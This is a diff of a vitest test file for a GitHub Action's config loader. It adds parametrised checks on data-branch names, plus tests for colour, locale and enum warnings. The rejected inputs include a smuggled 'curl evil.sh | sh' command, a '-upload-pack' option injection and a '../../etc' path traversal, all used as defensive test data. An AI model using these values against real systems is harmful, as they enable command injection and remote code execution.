@@ -1,5 +1,6 @@
 import * as fs from 'node:fs';
 import * as core from '@actions/core';
+import { CompareAgainst, NotificationMode } from '@domain/types';
 import { beforeEach, describe, expect, it, vi } from 'vitest';
 import { DEFAULTS } from './defaults';
 import { loadConfig, loadConfigFile } from './loader';
@@ -13,7 +14,7 @@ import {
   parseNumber,
   toStringList,
 } from './parsers';
-import { ChartCurve, CompareAgainst, NotificationMode, Visibility } from './types';
+import { ChartCurve, Visibility } from './types';
 
 vi.mock('@actions/core', () => ({
   getInput: vi.fn().mockReturnValue(''),
@@ -257,6 +258,7 @@ describe('loadConfigFile', () => {
   beforeEach(() => {
     vi.clearAllMocks();
     vi.mocked(core.getInput).mockReturnValue('');
+    vi.mocked(fs.existsSync).mockReturnValue(false);
     vi.mocked(fs.readFileSync).mockReturnValue('');
   });
 
@@ -331,6 +333,7 @@ describe('loadConfig', () => {
   beforeEach(() => {
     vi.clearAllMocks();
     vi.mocked(core.getInput).mockReturnValue('');
+    vi.mocked(fs.existsSync).mockReturnValue(false);
     vi.mocked(fs.readFileSync).mockReturnValue('');
   });
 
@@ -422,22 +425,34 @@ describe('loadConfig', () => {
     expect(config.velocityMetrics).toBe(true);
   });
 
-  it('rejects a data-branch that could escape the worktree path', () => {
-    mockInputs({ 'data-branch': '../../etc' });
+  it.each([
+    '../../etc',
+    'main; curl evil.sh | sh',
+    '-upload-pack=x',
+    'foo//bar',
+    'foo/.bar',
+    'foo.',
+    'foo.lock',
+    'foo~1',
+    'foo bar',
+  ])('rejects the data-branch %j', (dataBranch) => {
+    mockInputs({ 'data-branch': dataBranch });
 
     expect(() => loadConfig()).toThrow(/Invalid data-branch/);
   });
 
-  it('rejects a data-branch carrying shell metacharacters', () => {
-    mockInputs({ 'data-branch': 'main; curl evil.sh | sh' });
+  it.each([
+    'data/star-tracker',
+    '_star-data',
+    'stars@v2',
+    'stars+data',
+    'feature/JIRA-123',
+    'v1.2.3',
+    'UPPER_case-1',
+  ])('accepts the valid git branch name %j', (dataBranch) => {
+    mockInputs({ 'data-branch': dataBranch });
 
-    expect(() => loadConfig()).toThrow(/Invalid data-branch/);
-  });
-
-  it('accepts a namespaced data-branch', () => {
-    mockInputs({ 'data-branch': 'data/star-tracker' });
-
-    expect(loadConfig().dataBranch).toBe('data/star-tracker');
+    expect(loadConfig().dataBranch).toBe(dataBranch);
   });
 
   it('defaults read-only to false', () => {
@@ -455,6 +470,64 @@ describe('loadConfig', () => {
     vi.mocked(fs.readFileSync).mockReturnValue('read_only: true');
 
     expect(loadConfig().readOnly).toBe(true);
+  });
+
+  it('survives an unquoted hex colour in the config file', () => {
+    vi.mocked(fs.existsSync).mockReturnValue(true);
+    vi.mocked(fs.readFileSync).mockReturnValue('chart_line_color: 123456');
+
+    expect(() => loadConfig()).not.toThrow();
+    expect(loadConfig().chartLineColor).toBe(DEFAULTS.chartLineColor);
+  });
+
+  it('accepts a quoted hex colour from the config file', () => {
+    vi.mocked(fs.existsSync).mockReturnValue(true);
+    vi.mocked(fs.readFileSync).mockReturnValue('chart_line_color: "6b63ff"');
+
+    expect(loadConfig().chartLineColor).toBe('#6b63ff');
+  });
+
+  it('falls back and warns on an unsupported locale', () => {
+    mockInputs({ locale: 'fr' });
+
+    const config = loadConfig();
+
+    expect(config.locale).toBe(DEFAULTS.locale);
+    expect(core.warning).toHaveBeenCalledWith(
+      'Invalid locale "fr". Must be "en", "es", "ca", or "it". Falling back to "en"',
+    );
+  });
+
+  it('spells out the allowed values in an enum warning', () => {
+    mockInputs({ 'chart-curve': 'zigzag' });
+
+    loadConfig();
+
+    expect(core.warning).toHaveBeenCalledWith(
+      'Invalid chart-curve "zigzag". Must be "catmull-rom", "monotone", "cubic-bezier", or "rounded-step". Falling back to "monotone"',
+    );
+  });
+
+  it('warns on an unrecognized boolean input instead of silently ignoring it', () => {
+    mockInputs({ 'chart-animation': 'yes' });
+
+    const config = loadConfig();
+
+    expect(config.chartAnimation).toBe(DEFAULTS.chartAnimation);
+    expect(core.warning).toHaveBeenCalledWith(
+      expect.stringContaining('Invalid chart-animation "yes"'),
+    );
+  });
+
+  it('does not name a fallback the config file may override', () => {
+    vi.mocked(fs.existsSync).mockReturnValue(true);
+    vi.mocked(fs.readFileSync).mockReturnValue('min_stars: 10');
+    mockInputs({ 'min-stars': 'abc' });
+
+    const config = loadConfig();
+
+    expect(config.minStars).toBe(10);
+    expect(core.warning).toHaveBeenCalledWith('Invalid min-stars "abc". Ignoring it.');
   });
 
   it('warns on an unparseable numeric input instead of silently ignoring it', () => {
